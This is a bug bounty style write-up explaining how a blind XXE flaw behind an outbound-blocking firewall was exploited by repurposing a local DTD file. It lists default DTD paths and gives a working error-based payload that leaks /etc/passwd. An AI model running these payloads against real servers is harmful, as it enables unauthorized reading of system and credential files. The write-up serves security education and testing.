# :globe_with_meridians: Data exfiltration using XXE on a hardened server

---

*Image source: [https://www.netsparker.com/blog/web-security/xxe-xml-external-entity-attacks/](https://www.netsparker.com/blog/web-security/xxe-xml-external-entity-attacks/)*

# Data exfiltration using XXE on a hardened server

>

This is a special case of XXE so it would be nice to know the basics of XXE before reading this article.

XXE stands for XML External Entity. This is part of the Security misconfiguration of the OWASP Top Ten. The flaw can allow an attacker to turn the XML parser into a proxy. Successful exploitation can result in exfiltration of local files to SSRF or even a RCE.

Enough about XXE and onto the exploitation part.

## Detection and unsuccessful attempts of exploitation

As part of my automation, regular nuclei scan resulted in the detection of blind XXE. The target server, when injected with a XXE payload with interactsh (Project discovery alternative to burp collaborator) URL was doing a DNS lookup of the Hostname. The injection point was in the body of the webpage, just by changing the Request from GET to POST and Content-type to text/xml. When supplying with payload the server returned nothing(no response at all).

*So what’s the deal, can’t blind XXE be exploited ?*

Yes it can be exploited but there was some WAF that prevented all the outgoing *http *traffic. For blind XXE, we can host any external DTD file and make the XML parser send a request to that file, as the outbound *http *traffic was blocked, we could somehow host it internally on the target webserver through any upload functionality but the website had ZERO functionality to try the file upload.

## The successful attempt

As upload is blocked, we can use some internal DTD files for error based exploitation.

>

Source below (1)

A DTD is a Document Type Definition. It specifies the structure, elements and the attributes of an XML document.

The server had only http, ftp and file protocols present. Hopefully while enumerating other protocols, the sever responded with some errors. We can check if the file is present or not we can use *file* protocol. To enumerate other protocols , I just replaced the “*file”* with other protocols (gopher, smtp, ftp etc) and look at the error message. If the file is not present, the server responds with (No such file) along with other errors.

```
<?xml version=”1.0"?>
<!DOCTYPE foo SYSTEM “file:///etc/passwd”>
<foo>&e1;</foo>
```

This also confirms the presence of XXE injection and now we have ‘something’ to play with.

## Get Ritik Singh’s stories in your inbox

Join Medium for free to get updates from this writer.

Remember me for faster sign in

Here the regular entities were blocked so we had to use a DTD file with predefined entities in it. The WAF blocked all the outgoing http traffic and there was no way to upload a file so the only way was to use a file which was already present on the server. Operating systems by default contain some DTD files. In Linux systems, some of them are:

```
./properties/schemas/j2ee/XMLSchema.dtd
./../properties/schemas/j2ee/XMLSchema.dtd
./../../properties/schemas/j2ee/XMLSchema.dtd
/usr/share/java/jsp-api-2.2.jar!/javax/servlet/jsp/resources/jspxml.dtd
/usr/share/java/jsp-api-2.3.jar!/javax/servlet/jsp/resources/jspxml.dtd
/root/usr/share/doc/rh-python34-python-docutils-0.12/docs/ref/docutils.dtd
/root/usr/share/doc/rh-python35-python-docutils-0.12/docs/ref/docutils.dtd
/usr/share/doc/python2-docutils/docs/ref/docutils.dtd
/usr/share/yelp/dtd/docbookx.dtd
/usr/share/xml/fontconfig/fonts.dtd
/usr/share/xml/scrollkeeper/dtds/scrollkeeper-omf.dtd
/usr/lib64/erlang/lib/docbuilder-0.9.8.11/dtd/application.dtd
/usr/share/boostbook/dtd/1.1/boostbook.dtd
/usr/share/boostbook/dtd/boostbook.dtd
/usr/share/dblatex/schema/dblatex-config.dtd
/usr/share/struts/struts-config_1_0.dtd
/opt/sas/sw/tomcat/shared/lib/jsp-api.jar!/javax/servlet/jsp/resources/jspxml.dtd
```

>

Source below (2)

Now for error based exploitation, it is necessary to know about the entities present in the DTD file. Again we can check the presence of the DTD files using the the *file *protocol as shown above by supplying it with various file paths and looking at the error message. In my tests I found the “/usr/share/xml/fontconfig/fonts.dtd” file present on the system. The fonts.dtd file has an injectable entity “%constant”. Now I just need to know the location of the file that I want to exfiltrate. For PoC, the contents of “/etc/passwd” is enough. The final payload looks like:

```
<!DOCTYPE message [
<!ENTITY % local_dtd SYSTEM "file:///usr/share/xml/fontconfig/fonts.dtd"><!ENTITY % constant 'aaa)>
<!ENTITY &#x25; file SYSTEM "file:///etc/passwd">
<!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///ritik/&#x25;file;&#x27;>">
&#x25;eval;
&#x25;error;
<!ELEMENT aa (bb'>%local_dtd;
]>
<message>Text</message>
```

The way this payload works is similar to error based XXE, the only difference is that we are using an already present dtd file to trigger the error.

When sent this payload, the parsing error contains sensitive data of the specified file.

## Resources

These were the resources I used for successful exploitation.

- Blog by [Arseniy Sharoglazov](https://mohemiv.com/) who discovered this technique: [https://mohemiv.com/all/exploiting-xxe-with-local-dtd-files/](https://mohemiv.com/all/exploiting-xxe-with-local-dtd-files/)

- Discovering local dtd files: [https://www.gosecure.net/blog/2019/07/16/automating-local-dtd-discovery-for-xxe-exploitation/](https://www.gosecure.net/blog/2019/07/16/automating-local-dtd-discovery-for-xxe-exploitation/)

- List of entities present in various default dtd files: [https://github.com/GoSecure/dtd-finder/blob/master/list/xxe_payloads.md](https://github.com/GoSecure/dtd-finder/blob/master/list/xxe_payloads.md)

- How the error based XXE works : [https://portswigger.net/web-security/xxe/blind#exploiting-blind-xxe-to-retrieve-data-via-error-messages](https://portswigger.net/web-security/xxe/blind#exploiting-blind-xxe-to-retrieve-data-via-error-messages)

- Portswigger lab to practice: [https://portswigger.net/web-security/xxe/blind/lab-xxe-trigger-error-message-by-repurposing-local-dtd](https://portswigger.net/web-security/xxe/blind/lab-xxe-trigger-error-message-by-repurposing-local-dtd)

---
